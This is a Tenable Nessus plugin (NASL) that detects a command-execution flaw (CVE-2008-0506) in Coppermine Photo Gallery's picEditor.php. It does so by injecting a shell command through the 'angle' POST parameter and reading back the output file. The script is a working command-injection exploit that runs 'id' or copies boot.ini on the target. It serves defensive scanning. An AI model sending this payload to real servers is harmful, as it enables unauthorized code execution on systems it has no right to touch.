#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(30132);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2008-0506");
  script_bugtraq_id(27512);
  script_xref(name:"OSVDB", value:"41676");

  script_name(english:"Coppermine imageObjectIM.class.php Command Execution Vulnerabilities");
  script_summary(english:"Tries to run a command using Coppermine");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The version of Coppermine Photo Gallery installed on the remote host
fails to sanitize user input to the 'quality', 'angle' and 'clipval'
parameters of the 'picEditor.php' script before using it in 'exec()'
statements to call ImageMagick to process new images.  An
unauthenticated remote attacker can leverage this issue to execute
arbitrary code on the remote host subject to the privileges of the web
server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.waraxe.us/advisory-65.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/487310/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://coppermine-gallery.net/forum/index.php?topic=50103.0" );
 script_set_attribute(attribute:"solution", value:
"Either reconfigure the application to use GD as its graphics library,
which is the default, or upgrade to Coppermine Photo Gallery version
1.4.15 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("coppermine_gallery_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

outfile = string("include/", SCRIPT_NAME, "-", unixtime(), ".log");

os = get_kb_item("Host/OS");
if (os && "Windows" >< os) cmd = string("cmd /c copy C:\\boot.ini ", outfile);
else cmd = string("id|tee ", outfile);


# Test an install.
install = get_kb_item(string("www/", port, "/coppermine_photo_gallery"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/picEditor.php");

  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ("background-image:url(picEditor.php?img=left);" >< res)
  {
    # Try to exploit the flaw to run a command.
    exploit = string("180;", cmd, ";");

    postdata = string(
      "newimage=../../images/thumb_zip.jpg&",
      "quality=50&",
      "angle=", exploit
    );
    r = http_send_recv3(method: "POST ", item: url, port: port,
      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
      data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    # Retrieve the file with our command output.
    r = http_send_recv3(method:"GET", item:string(dir, "/", outfile), port:port);
    if (isnull(r)) exit(0);
    res = r[2];

    if (
      strlen(res) &&
      (
        ("id" >< cmd && egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)) ||
        ("boot.ini" >< cmd && "[boot loader]" >< res)
      )
    )
    {
      if (report_verbosity)
      {
        if ("id" >< cmd) cmd = cmd - strstr(cmd, "|");

        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote\n",
          "host to produce the following results :\n",
          "\n",
          res
        );
        security_warning(port:port, extra:report);
      }
    else security_warning(port);
    }
  }
}
